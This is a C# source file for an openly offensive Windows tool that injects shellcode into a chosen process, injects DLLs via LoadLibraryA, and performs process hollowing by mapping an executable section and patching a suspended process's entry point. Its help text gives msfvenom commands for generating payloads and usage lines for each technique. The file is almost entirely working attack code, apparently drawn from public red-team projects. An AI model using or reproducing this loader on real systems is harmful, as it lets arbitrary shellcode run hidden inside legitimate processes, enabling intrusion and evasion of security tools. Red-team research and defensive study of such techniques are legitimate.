using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);

        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);

        [DllImport("Kernel32", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("Kernel32", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        #region DLL Injection
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandleA(string lpModuleName);

        [DllImport("kernel32", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        #endregion DLL Injection

        #region Process Hollowing
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, MemProtect pageProt, MemAllocation allocationAttribs, IntPtr hFile);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, MemAllocation alloctype, MemProtect prot);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);
        #endregion Process Hollowing

        //http://www.pinvoke.net/default.aspx/kernel32/OpenProcess.html
        public enum ProcessAccessRights
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        public enum MemAllocation
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x1000000,
            SecCommit = 0x08000000
        }

        //https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
        public enum MemProtect
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
        }

        // https://docs.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights
        public enum MemOpenThreadAccess
        {

            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_WRITE = 0x0020,
            PROCESS_VM_READ = 0x0010,
            SUSPEND_RESUME = 0x0002,
        }

        #region Process Hollowing Structs
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public uint dwOem;
            public uint dwPageSize;
            public IntPtr lpMinAppAddress;
            public IntPtr lpMaxAppAddress;
            public IntPtr dwActiveProcMask;
            public uint dwNumProcs;
            public uint dwProcType;
            public uint dwAllocGranularity;
            public ushort wProcLevel;
            public ushort wProcRevision;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }
        #endregion End of Process Hollowing Structs
        /*
        #region Process Hollowing Flags
        [Flags]
        public enum CreationFlags
        {
            CreateSuspended = 0x00000004,
            DetachedProcesds = 0x00000008,
            CreateNoWindow = 0x08000000,
            ExtendedStartupInfoPresent = 0x00080000
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Releae = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000,
            SecCommit = 0x08000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }
        #endregion End of Process Hollowing Flags
        */

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        public static byte[] convertfromc(string val)
        {
            string rval = val.Replace("\"", string.Empty).Replace("\r\n", string.Empty).Replace("x", string.Empty);
            string[] sval = rval.Split('\\');

            var fval = string.Empty;
            foreach (var lval in sval)
            {
                if (lval != null)
                {
                    fval += lval;
                }
            }

            return StringToByteArray(fval);
        }

        public static void CodeInject(int pid, byte[] buf)
        {
            try
            {
                uint lpNumberOfBytesWritten = 0;
                uint lpThreadId = 0;
                Console.WriteLine($"[+] Obtaining the handle for the process id {pid}.");
                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
                Console.WriteLine($"[+] Handle {pHandle} opened for the process id {pid}.");
                Console.WriteLine($"[+] Allocating memory to inject the shellcode.");
                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                Console.WriteLine($"[+] Memory for injecting shellcode allocated at 0x{rMemAddress}.");
                Console.WriteLine($"[+] Writing the shellcode at the allocated memory location.");
                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                {
                    Console.WriteLine($"[+] Shellcode written in the process memory.");
                    Console.WriteLine($"[+] Creating remote thread to execute the shellcode.");
                    IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId);
                    bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
                    Console.WriteLine($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
                }
                else
                {
                    Console.WriteLine($"[+] Failed to inject the shellcode into the memory of the process id {pid}.");
                }
                //WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
                bool hOpenProcessClose = CloseHandle(pHandle);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                Console.WriteLine(ex.Message);
            }
        }


        public static void DLLInject(int pid, byte[] buf)
        {
            try
            {
                uint lpNumberOfBytesWritten = 0;
                uint lpThreadId = 0;
                Console.WriteLine($"[+] Obtaining the handle for the process id {pid}.");
                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
                Console.WriteLine($"[+] Handle {pHandle} opened for the process id {pid}.");
                IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
                Console.WriteLine($"[+] {loadLibraryAddr} is the address of the LoadLibraryA exported function.");
                Console.WriteLine($"[+] Allocating memory for the DLL path.");
                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                Console.WriteLine($"[+] Memory for injecting DLL path is allocated at 0x{rMemAddress}.");
                Console.WriteLine($"[+] Writing the DLL path at the allocated memory location.");
                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                {
                    Console.WriteLine($"[+] DLL path written in the target process memory.");
                    Console.WriteLine($"[+] Creating remote thread to execute the DLL.");
                    IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, loadLibraryAddr, rMemAddress, 0, ref lpThreadId);
                    bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
                    Console.WriteLine($"[+] Sucessfully injected the DLL into the memory of the process id {pid}.");
                }
                else
                {
                    Console.WriteLine($"[+] Failed to inject the DLL into the memory of the process id {pid}.");
                }
                //WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
                bool hOpenProcessClose = CloseHandle(pHandle);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                Console.WriteLine(ex.Message);
            }
        }

        public class ProcHollowing
        {
            /*
            Credits goes to Aaron - https://github.com/ambray,  Michael Gorelik<smgorelik@gmail.com> and @_RastaMouse
            https://github.com/ambray/ProcessHollowing
            https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75
            https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Hollower.cs
            */

            IntPtr section_;
            IntPtr localmap_;
            IntPtr remotemap_;
            IntPtr localsize_;
            IntPtr remotesize_;
            IntPtr pModBase_;
            IntPtr pEntry_;
            uint rvaEntryOffset_;
            uint size_;
            byte[] inner_;
            public const uint CreateSuspended = 0x00000004;
            public const uint DetachedProcess = 0x00000008;
            public const uint CreateNoWindow = 0x08000000;
            private const ulong PatchSize = 0x10;

            public uint round_to_page(uint size)
            {
                SYSTEM_INFO info = new SYSTEM_INFO();

                GetSystemInfo(ref info);

                return (info.dwPageSize - size % info.dwPageSize) + size;
            }

            private bool nt_success(long v)
            {
                return (v >= 0);
            }

            public IntPtr GetCurrent()
            {
                return GetCurrentProcess();
            }

            private IntPtr GetBuffer()
            {
                return localmap_;
            }


            public static PROCESS_INFORMATION StartProcess(string binaryPath)
            {
                uint flags = CreateSuspended | DetachedProcess | CreateNoWindow;

                STARTUPINFO startInfo = new STARTUPINFO();
                PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
                CreateProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);
                Console.WriteLine($"[+] Process {binaryPath} started in a suspended state.");

                return procInfo;
            }

            /*
            https://github.com/peperunas/injectopi/tree/master/CreateSection
            Attemp to create executatble section
            */
            private bool CreateSection(uint size)
            {
                LARGE_INTEGER liVal = new LARGE_INTEGER();
                size_ = round_to_page(size);
                liVal.LowPart = size_;

                var status = ZwCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, MemProtect.PAGE_EXECUTE_READWRITE, MemAllocation.SecCommit, (IntPtr)0);
                Console.WriteLine($"[+] Executable section created.");
                return nt_success(status);
            }

            private KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, MemProtect protect, IntPtr addr)
            {
                IntPtr baseAddr = addr;
                IntPtr viewSize = (IntPtr)size_;

                var status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
                return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
            }

            private void SetLocalSection(uint size)
            {
                var vals = MapSection(GetCurrent(), MemProtect.PAGE_READWRITE, IntPtr.Zero);
                Console.WriteLine($"[+] Map view section to the current process: {vals}.");
                localmap_ = vals.Key;
                localsize_ = vals.Value;
            }

            private void CopyShellcode(byte[] buf)
            {
                var lsize = size_;
                Console.WriteLine($"[+] Copying Shellcode into section: {lsize}. ");

                unsafe
                {
                    byte* p = (byte*)localmap_;

                    for (int i = 0; i < buf.Length; i++)
                    {
                        p[i] = buf[i];
                    }
                }
            }

            private KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
            {
                int i = 0;
                IntPtr ptr;

                ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);
                Console.WriteLine($"[+] Preparing shellcode patch for the new process entry point: {ptr}. ");

                unsafe
                {
                    
                    var p = (byte*)ptr;
                    byte[] tmp = null;

                    if (IntPtr.Size == 4)
                    {
                        p[i] = 0xb8;
                        i++;
                        var val = (Int32)dest;
                        tmp = BitConverter.GetBytes(val);
                    }
                    else
                    {
                        p[i] = 0x48;
                        i++;
                        p[i] = 0xb8;
                        i++;

                        var val = (Int64)dest;
                        tmp = BitConverter.GetBytes(val);
                    }

                    for (int j = 0; j < IntPtr.Size; j++)
                        p[i + j] = tmp[j];

                    i += IntPtr.Size;
                    p[i] = 0xff;
                    i++;
                    p[i] = 0xe0;
                    i++;
                    
                }

                return new KeyValuePair<int, IntPtr>(i, ptr);
            }

            private IntPtr GetEntryFromBuffer(byte[] buf)
            {
                Console.WriteLine($"[+] Locating the entry point for the main module in remote process.");
                IntPtr res = IntPtr.Zero;
                unsafe
                {
                    fixed (byte* p = buf)
                    {
                        uint e_lfanew_offset = *((uint*)(p + 0x3c));

                        byte* nthdr = (p + e_lfanew_offset);

                        byte* opthdr = (nthdr + 0x18);

                        ushort t = *((ushort*)opthdr);

                        byte* entry_ptr = (opthdr + 0x10);

                        var tmp = *((int*)entry_ptr);

                        rvaEntryOffset_ = (uint)tmp;

                        if (IntPtr.Size == 4)
                            res = (IntPtr)(pModBase_.ToInt32() + tmp);
                        else
                            res = (IntPtr)(pModBase_.ToInt64() + tmp);

                    }
                }

                pEntry_ = res;
                return res;
            }

            private IntPtr FindEntry(IntPtr hProc)
            {
                var basicInfo = new PROCESS_BASIC_INFORMATION();
                uint tmp = 0;

                var success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
                Console.WriteLine($"[+] Locating the module base address in the remote process.");

                IntPtr readLoc = IntPtr.Zero;
                var addrBuf = new byte[IntPtr.Size];
                if (IntPtr.Size == 4)
                {
                    readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
                }
                else
                {
                    readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
                }

                IntPtr nRead = IntPtr.Zero;

                ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead);

                if (IntPtr.Size == 4)
                    readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
                else
                    readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

                pModBase_ = readLoc;
                ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);
                Console.WriteLine($"[+] Read the first page and locate the entry point: {readLoc}.");

                return GetEntryFromBuffer(inner_);
            }

            public void MapAndStart(PROCESS_INFORMATION pInfo)
            {
                var tmp = MapSection(pInfo.hProcess, MemProtect.PAGE_EXECUTE_READ, IntPtr.Zero);
                Console.WriteLine($"[+] Locate shellcode into the suspended remote porcess: {tmp}.");

                remotemap_ = tmp.Key;
                remotesize_ = tmp.Value;

                var patch = BuildEntryPatch(tmp.Key);

                try
                {
                    var pSize = (IntPtr)patch.Key;
                    IntPtr tPtr = new IntPtr();

                    WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr);
                }
                finally
                {
                    if (patch.Value != IntPtr.Zero)
                        Marshal.FreeHGlobal(patch.Value);
                }

                var tbuf = new byte[0x1000];
                var nRead = new IntPtr();

                ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);
                var res = ResumeThread(pInfo.hThread);
                Console.WriteLine($"[+] Process has been resumed.");
            }

            ~ProcHollowing()
           {
                Console.WriteLine($"[+] Unmap view section.");
                if (localmap_ != (IntPtr)0)
                   ZwUnmapViewOfSection(section_, localmap_);
            }

            public void Hollow(string binary, byte[] shellcode)
            {
                var pinf = StartProcess(binary);

                FindEntry(pinf.hProcess);
                CreateSection((uint)shellcode.Length);
                SetLocalSection((uint)shellcode.Length);
                CopyShellcode(shellcode);
                MapAndStart(pinf);
                CloseHandle(pinf.hThread);
                CloseHandle(pinf.hProcess);
            }

            public ProcHollowing()
            {
                section_ = new IntPtr();
                localmap_ = new IntPtr();
                remotemap_ = new IntPtr();
                localsize_ = new IntPtr();
                remotesize_ = new IntPtr();
                inner_ = new byte[0x1000];
            }

        }


        public static void logo()
        {
            Console.WriteLine();
            Console.WriteLine("################################################################################################");
            Console.WriteLine("#  ____  ____   ___   ____ _____ ____ ____    ___ _   _     _ _____ ____ _____ ___ ___  _   _  #");
            Console.WriteLine("# |  _ \\|  _ \\ / _ \\ / ___| ____/ ___/ ___|  |_ _| \\ | |   | | ____/ ___|_   _|_ _/ _ \\| \\ | | #");
            Console.WriteLine("# | |_) | |_) | | | | |   |  _| \\___ \\___ \\   | ||  \\| |_  | |  _|| |     | |  | | | | |  \\| | #");
            Console.WriteLine("# |  __/|  _ <| |_| | |___| |___ ___) |__) |  | || |\\  | |_| | |__| |___  | |  | | |_| | |\\  | #");
            Console.WriteLine("# |_|   |_| \\_\\\\___/ \\____|_____|____/____/  |___|_| \\_|\\___/|_____\\____| |_| |___\\___/|_| \\_| #");
            Console.WriteLine("#                                                                                              #");
            Console.WriteLine("################################################################################################");
            Console.WriteLine();

        }

        public static void help()
        {

            string help = @"
*****************Help*****************
[+] The program is designed to perform process injection.
[+] Currently the tool supports 3 process injection techniques.
    1) Vanila Process Injection
    2) DLL Injection
    3) Process Hollowing

[+] Vanila Process Injection and Process Hollowing
[+] Currently the program accepts shellcode in 3 formats 
    1) base64
    2) hex
    3) C

[+] Generating shellcode in base64 format and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" | base64
[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:base64 /t:1

[+] Generating shellcode in hex format and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f hex
[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:hex /t:1

[+] Generating shellcode in c format and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f c
[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:1

[+] DLL Injection
[+] Generating DLL and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f dll > Desktop/calc.dll
[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\calc.dll"" /t:2

[+] Process Hollowing
[+] Generating shellcode in c format and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f c
[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:3

";
            Console.WriteLine(help);
        }
        static void Main(string[] args)
        {
            try
            {
                logo();
                // https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Domain/ArgumentParser.cs#L10

                var arguments = new Dictionary<string, string>();
                foreach (var argument in args)
                {
                    var idx = argument.IndexOf(':');
                    if (idx > 0)
                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                    else
                        arguments[argument] = string.Empty;
                }

                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                {
                    Console.WriteLine($"[+] Process running with {principal.Identity.Name} privileges with HIGH integrity.");
                }
                else
                {
                    Console.WriteLine($"[+] Process running with {principal.Identity.Name} privileges with MEDIUM / LOW integrity.");
                }

                if (arguments.Count == 0)
                {
                    Console.WriteLine("[+] No arguments specified. Please refer the help section for more details.");
                    help();
                }
                else if (arguments.Count < 3)
                {
                    Console.WriteLine("[+] Some arguments are missing. Please refer the help section for more details.");
                    help();
                }
                else if (arguments.Count >= 3)
                {
                    int procid = 0;
                    if (arguments.ContainsKey("/pid"))
                    {
                        procid = Convert.ToInt32(arguments["/pid"]);
                        Process process = Process.GetProcessById(procid);
                    }
                    if (System.IO.File.Exists(arguments["/path"]))
                    {
                        if (arguments["/t"] == "1")
                        {
                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
                            byte[] buf = new byte[] { };
                            if (arguments["/f"] == "base64")
                            {
                                buf = Convert.FromBase64String(shellcode);
                            }
                            else if (arguments["/f"] == "hex")
                            {
                                buf = StringToByteArray(shellcode);
                            }
                            else if (arguments["/f"] == "c")
                            {
                                buf = convertfromc(shellcode);
                            }
                            CodeInject(procid, buf);
                        }
                        else if (arguments["/t"] == "2")
                        {
                            var dllpath = arguments["/path"];
                            byte[] buf = Encoding.Default.GetBytes(dllpath);
                            DLLInject(procid, buf);
                        }
                        else if (arguments["/t"] == "3")
                        {
                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
                            byte[] buf = new byte[] { };
                            if (arguments["/f"] == "base64")
                            {
                                buf = Convert.FromBase64String(shellcode);
                            }
                            else if (arguments["/f"] == "hex")
                            {
                                buf = StringToByteArray(shellcode);
                            }
                            else if (arguments["/f"] == "c")
                            {
                                buf = convertfromc(shellcode);
                            }
                            ProcHollowing prochollow = new ProcHollowing();
                            prochollow.Hollow(arguments["/ppath"], buf);
                        }
                    }
                    else
                    {
                        Console.WriteLine("[+] File doesn't exists. Please check the specified file path.");
                    }
                }
                else
                {
                    Console.WriteLine("[+] Invalid argument. Please refer the help section for more details.");
                    help();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
